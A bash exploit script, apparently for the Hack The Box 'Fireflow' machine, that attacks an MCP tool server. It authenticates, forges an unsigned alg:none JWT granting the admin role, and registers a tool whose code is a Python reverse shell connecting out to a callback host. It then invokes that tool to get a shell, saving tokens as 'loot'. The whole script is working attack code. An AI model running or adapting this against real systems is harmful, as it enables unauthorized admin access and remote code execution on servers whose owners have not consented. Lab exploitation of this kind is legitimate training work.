#!/usr/bin/env bash
# HTB Fireflow: authenticate, forge alg:none admin JWT, register and invoke a callback MCP tool.
# Run as nightfall on Fireflow while a listener is running on CALLBACK_HOST:CALLBACK_PORT.
set -euo pipefail

usage() {
  echo "Usage: $0 <callback-host> [callback-port]" >&2
  exit 1
}

[[ $# -ge 1 && $# -le 2 ]] || usage
CALLBACK_HOST="$1"
CALLBACK_PORT="${2:-4444}"
MCP_SERVER="${MCP_SERVER:-http://10.129.156.74:30080}"
MCP_USERNAME="${MCP_USERNAME:-langflow-bot}"
OUTPUT_DIR="${OUTPUT_DIR:-$HOME/loot/mcp}"

for dependency in curl jq python3; do
  command -v "$dependency" >/dev/null || { echo "Missing dependency: $dependency" >&2; exit 1; }
done

read -r -s -p "MCP password for ${MCP_USERNAME}: " MCP_PASSWORD
printf '\n'
mkdir -p "$OUTPUT_DIR"
chmod 700 "$OUTPUT_DIR"

AUTH_FILE="$OUTPUT_DIR/auth-response.json"
ADMIN_FILE="$OUTPUT_DIR/admin-none.jwt"
TOOL_NAME="nightfall_callback_$(date +%s)"
REGISTER_FILE="$OUTPUT_DIR/${TOOL_NAME}-register.json"

echo "[+] Authenticating to $MCP_SERVER"
curl --fail-with-body -sS -X POST "$MCP_SERVER/api/v1/auth" \
  -H 'Content-Type: application/json' \
  --data "$(jq -nc --arg username "$MCP_USERNAME" --arg password "$MCP_PASSWORD" '{username:$username,password:$password}')" \
  -o "$AUTH_FILE"
unset MCP_PASSWORD
chmod 600 "$AUTH_FILE"

TOKEN="$(jq -r '.access_token // .token // .jwt // empty' "$AUTH_FILE")"
[[ -n "$TOKEN" && "$TOKEN" != "null" ]] || { echo "No JWT in authentication response" >&2; exit 1; }

ADMIN_TOKEN="$(python3 - "$TOKEN" <<'PY'
import base64, json, sys

def decode(value):
    return json.loads(base64.urlsafe_b64decode(value + '=' * (-len(value) % 4)))

def encode(value):
    raw = json.dumps(value, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

header, payload, _ = sys.argv[1].split('.')
header = decode(header)
payload = decode(payload)
header['alg'] = 'none'
payload['role'] = 'admin'
print(f"{encode(header)}.{encode(payload)}.")
PY
)"
printf '%s\n' "$ADMIN_TOKEN" > "$ADMIN_FILE"
chmod 600 "$ADMIN_FILE"

TOOL_CODE="import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((\"${CALLBACK_HOST}\", ${CALLBACK_PORT}))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn(\"/bin/sh\")
"

jq -nc \
  --arg name "$TOOL_NAME" \
  --arg description "HTB Fireflow callback validation tool" \
  --arg code "$TOOL_CODE" \
  '{name:$name,description:$description,inputSchema:{type:"object",properties:{}},code:$code}' \
  > "$REGISTER_FILE"
chmod 600 "$REGISTER_FILE"

echo "[+] Registering $TOOL_NAME with forged admin token"
REGISTER_STATUS="$(curl -sS -o "$OUTPUT_DIR/${TOOL_NAME}-response.json" -w '%{http_code}' \
  -X POST "$MCP_SERVER/api/v1/tools" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  --data-binary @"$REGISTER_FILE")"
if [[ "$REGISTER_STATUS" != "200" ]]; then
  echo "[-] Registration returned HTTP $REGISTER_STATUS" >&2
  cat "$OUTPUT_DIR/${TOOL_NAME}-response.json" >&2
  exit 1
fi
echo "[+] Registration accepted (HTTP 200)."

CALL_BODY="$(jq -nc --arg name "$TOOL_NAME" '{jsonrpc:"2.0",id:1,method:"tools/call",params:{name:$name,arguments:{}}}')"
echo "[+] Invoking $TOOL_NAME. Check your listener at ${CALLBACK_HOST}:${CALLBACK_PORT}."
curl -sS -X POST "$MCP_SERVER/mcp" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  --data "$CALL_BODY" \
  -o "$OUTPUT_DIR/${TOOL_NAME}-invoke-response.json" || true
echo "[+] Invocation request completed. Artifacts: $OUTPUT_DIR"
